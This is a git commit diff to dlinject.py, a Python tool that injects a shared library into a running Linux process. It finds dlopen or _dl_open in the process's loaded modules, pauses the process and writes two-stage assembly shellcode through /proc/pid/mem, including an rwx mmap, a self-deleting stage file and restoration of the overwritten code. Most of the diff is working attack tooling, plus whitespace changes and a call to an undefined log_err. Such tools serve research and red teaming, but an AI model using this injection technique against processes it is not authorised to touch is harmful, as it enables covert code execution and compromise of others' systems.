8f02aa34bebb4d048825b9ec1a4d04d03effd0fc
sad0p <sad0p@protonmail.com>
2025-01-27 20:08:37 -0500

    Added: search for dlopen in libc, assemble to a file and extract textsegment, use .dynsym instead of .symtab

--- dlinject.py
+++ dlinject.py
@@ -4,12 +4,12 @@ f"Python version >= 3.6 required!"
 # ^^^ fstrings are valid since python 3.6, will syntax error otherwise
 
 BANNER = r"""
-    .___.__  .__            __               __
-  __| _/|  | |__| ____     |__| ____   _____/  |_  ______ ___.__.
- / __ | |  | |  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
-/ /_/ | |  |_|  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
-\____ | |____/__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
-     \/              \/\______|    \/     \/     \/|__|   \/
+	.___.__  .__			__				 __
+  __| _/|  | |__| ____	   |__| ____   _____/  |_  ______ ___.__.
+ / __ | |  | |	|/	  \    |  |/ __ \_/ ___\   __\ \____ <	 |	|
+/ /_/ | |  |_|	|	|  \   |  \  ___/\	\___|  |   |  |_> >___	|
+\____ | |____/__|___|  /\__|  |\___  >\___	>__| /\|   __// ____|
+	 \/				 \/\______|    \/	  \/	 \/|__|   \/
 
 source: https://github.com/DavidBuchanan314/dlinject
 """
@@ -20,6 +20,7 @@ import re
 import signal
 import time
 import subprocess
+import sys
 
 from elftools.elf.elffile import ELFFile
 
@@ -30,7 +31,7 @@ STAGE2_SIZE = 0x8000
 def lookup_elf_symbol(elf_name, sym_name):
 	with open(elf_name, "rb") as elf_file:
 		elf = ELFFile(elf_file)
-		symtab = elf.get_section_by_name(".symtab")
+		symtab = elf.get_section_by_name(".dynsym")
 		if not symtab:
 			return None
 		syms = symtab.get_symbol_by_name(sym_name)
@@ -61,43 +62,70 @@ def log_error(msg):
 	log(msg, "red", "!")
 	raise Exception(msg)
 
+def extract_text_segment(elf_file_path):
+	with open(elf_file_path, 'rb') as elf_file:
+		elf = ELFFile(elf_file)
+		text_section = elf.get_section_by_name('.text')
 
-def assemble(source):
-	cmd = "gcc -x assembler - -o /dev/stdout -nostdlib -Wl,--oformat=binary -m64"
+		if not text_section:
+			log_err(f"Did not find .text section in {elf_file_path} .")
+
+		return text_section.data()
+
+def assemble(source):	
+	tmp_elf = f"/tmp/tmpelf{os.urandom(8).hex()}"
+	cmd = f"gcc -x assembler - -o {tmp_elf} -nostdlib" 
 	argv = cmd.split(" ")
-	prefix = b".intel_syntax noprefix\n.globl _start\n_start:\n"
 
+	prefix = b".intel_syntax noprefix\n.globl _start\n_start:\n"
 	program = prefix + source.encode()
+	
 	pipe = subprocess.PIPE
 
-	result = subprocess.run(argv, stdout=pipe, stderr=pipe, input=program)
+	result = subprocess.run(argv,stdout=pipe, stderr=pipe, input=program)
 
 	if result.returncode != 0:
 		emsg = result.stderr.decode().strip()
 		log_error("Assembler command failed:\n\t" + emsg.replace("\n", "\n\t"))
+	data =	extract_text_segment(tmp_elf)
+	os.unlink(tmp_elf)
+	return data
 
-	return result.stdout
-
-
-def dlinject(pid, lib_path, stopmethod="sigstop"):
-	with open(f"/proc/{pid}/maps") as maps_file:
+def locate_dl_open(process_maps, mod_name):
+	fail = (False, None, None, None)
+	with open(process_maps) as maps_file:
 		for line in maps_file.readlines():
-			ld_path = line.split()[-1]
-			if re.match(r".*/ld-.*\.so", ld_path):
-				ld_base = int(line.split("-")[0], 16)
+			mod_path = line.split()[-1]
+			if mod_name in mod_path:
+				mod_base = int(line.split("-")[0], 16)
 				break
 		else:
-			log_error("Couldn't find ld.so! (we need it for _dl_open)")
+			return fail
 
-	log("ld.so found: " + repr(ld_path))
-	log("ld.so base: " + hex(ld_base))
-	dl_open_offset = lookup_elf_symbol(ld_path, "_dl_open")
+	if "libc" in mod_name:
+		dl_open_offset = lookup_elf_symbol(mod_path, "dlopen")
+	elif "ld-linux" in mod_name:
+		dl_open_offset = lookup_elf_symbol(mod_path, "_dl_open")
+	else:
+		return fail
 
-	if not dl_open_offset:
-		log_error("Unable to locate _dl_open symbol")
+	return (True, mod_base, mod_path, dl_open_offset)
 
-	dl_open_addr = ld_base + dl_open_offset
-	log("_dl_open: " + hex(dl_open_addr))
+def dlinject(pid, lib_path, stopmethod="sigstop"):
+	log("searching for dlopen...")
+	process_maps = f"/proc/{pid}/maps"
+	for mod in ["libc", "ld-linux"]:
+		status, mod_base, mod_path, dl_open_offset = locate_dl_open(process_maps, mod)
+		if status:
+			mod_name = mod
+			log(f"located dlopen in {mod_path} @ offset {hex(mod_base)}.")
+			break
+	else:
+		log_error("Unable to locater dlopen in either as either \"dlopen\" or \"_dl_open\"")
+
+	
+	dl_open_addr = mod_base + dl_open_offset
+	log(f"{mod_name}: " + hex(dl_open_addr))
 
 	if stopmethod == "sigstop":
 		log("Sending SIGSTOP")
@@ -123,7 +151,7 @@ def dlinject(pid, lib_path, stopmethod="sigstop"):
 			log("Waiting for process to freeze...")
 			time.sleep(0.1)
 	else:
-		log.warn("We're not going to stop the process first!")
+		print("We're not going to stop the process first!")
 
 	with open(f"/proc/{pid}/syscall") as syscall_file:
 		syscall_vals = syscall_file.read().split(" ")
@@ -155,32 +183,32 @@ def dlinject(pid, lib_path, stopmethod="sigstop"):
 		push r15
 
 		// Open stage2 file
-		mov rax, 2          # SYS_OPEN
-		lea rdi, path[rip]  # path
-		xor rsi, rsi        # flags (O_RDONLY)
-		xor rdx, rdx        # mode
+		mov rax, 2			# SYS_OPEN
+		lea rdi, path[rip]	# path
+		xor rsi, rsi		# flags (O_RDONLY)
+		xor rdx, rdx		# mode
 		syscall
-		mov r14, rax        # save the fd for later
+		mov r14, rax		# save the fd for later
 
 		// mmap it
-		mov rax, 9              # SYS_MMAP
-		xor rdi, rdi            # addr
-		mov rsi, {STAGE2_SIZE}  # len
-		mov rdx, 0x7            # prot (rwx)
-		mov r10, 0x2            # flags (MAP_PRIVATE)
-		mov r8, r14             # fd
-		xor r9, r9              # off
+		mov rax, 9				# SYS_MMAP
+		xor rdi, rdi			# addr
+		mov rsi, {STAGE2_SIZE}	# len
+		mov rdx, 0x7			# prot (rwx)
+		mov r10, 0x2			# flags (MAP_PRIVATE)
+		mov r8, r14				# fd
+		xor r9, r9				# off
 		syscall
-		mov r15, rax            # save mmap addr
+		mov r15, rax			# save mmap addr
 
 		// close the file
-		mov rax, 3    # SYS_CLOSE
+		mov rax, 3	  # SYS_CLOSE
 		mov rdi, r14  # fd
 		syscall
 
 		// delete the file (not exactly necessary)
-		mov rax, 87         # SYS_UNLINK
-		lea rdi, path[rip]  # path
+		mov rax, 87			# SYS_UNLINK
+		lea rdi, path[rip]	# path
 		syscall
 
 		// jump to stage2
@@ -211,29 +239,29 @@ def dlinject(pid, lib_path, stopmethod="sigstop"):
 		fxsave moar_regs[rip]
 
 		// Open /proc/self/mem
-		mov rax, 2                   # SYS_OPEN
+		mov rax, 2					 # SYS_OPEN
 		lea rdi, proc_self_mem[rip]  # path
-		mov rsi, 2                   # flags (O_RDWR)
-		xor rdx, rdx                 # mode
+		mov rsi, 2					 # flags (O_RDWR)
+		xor rdx, rdx				 # mode
 		syscall
 		mov r15, rax  # save the fd for later
 
 		// seek to code
-		mov rax, 8      # SYS_LSEEK
-		mov rdi, r15    # fd
-		mov rsi, {rip}  # offset
-		xor rdx, rdx    # whence (SEEK_SET)
+		mov rax, 8		# SYS_LSEEK
+		mov rdi, r15	# fd
+		mov rsi, {rip}	# offset
+		xor rdx, rdx	# whence (SEEK_SET)
 		syscall
 
 		// restore code
-		mov rax, 1                   # SYS_WRITE
-		mov rdi, r15                 # fd
-		lea rsi, old_code[rip]       # buf
+		mov rax, 1					 # SYS_WRITE
+		mov rdi, r15				 # fd
+		lea rsi, old_code[rip]		 # buf
 		mov rdx, {len(code_backup)}  # count
 		syscall
 
 		// close /proc/self/mem
-		mov rax, 3    # SYS_CLOSE
+		mov rax, 3	  # SYS_CLOSE
 		mov rdi, r15  # fd
 		syscall
 
@@ -252,10 +280,10 @@ def dlinject(pid, lib_path, stopmethod="sigstop"):
 		lea rsp, new_stack_base[rip-{STACK_BACKUP_SIZE}]
 
 		// call _dl_open (glibc/elf/dl-open.c)
-		lea rdi, lib_path[rip]  # file
-		mov rsi, 2              # mode (RTLD_NOW)
+		lea rdi, lib_path[rip]	# file
+		mov rsi, 2				# mode (RTLD_NOW)
 		mov rdx, {dl_open_addr} # caller_dlopen - needs to be "valid" on older libcs
-		xor rcx, rcx            # nsid (LM_ID_BASE) (could maybe use LM_ID_NEWLM)
+		xor rcx, rcx			# nsid (LM_ID_BASE) (could maybe use LM_ID_NEWLM)
 		mov rax, {dl_open_addr}
 		call rax
 
@@ -304,7 +332,7 @@ def dlinject(pid, lib_path, stopmethod="sigstop"):
 
 	new_stack_base:
 	""")
-
+	print(f"stage2 len => {len(stage2)}")
 	with open(stage2_path, "wb") as stage2_file:
 		os.chmod(stage2_path, 0o666)
 		stage2_file.write(stage2)
@@ -344,8 +372,8 @@ if __name__ == "__main__":
 	parser.add_argument("--stopmethod",
 		choices=["sigstop", "cgroup_freeze", "none"],
 		help="How to stop the target process prior to shellcode injection. \
-		      SIGSTOP (default) can have side-effects. cgroup freeze requires root.\
-		      'none' is likely to cause race conditions.")
+			  SIGSTOP (default) can have side-effects. cgroup freeze requires root.\
+			  'none' is likely to cause race conditions.")
 
 	args = parser.parse_args()
 
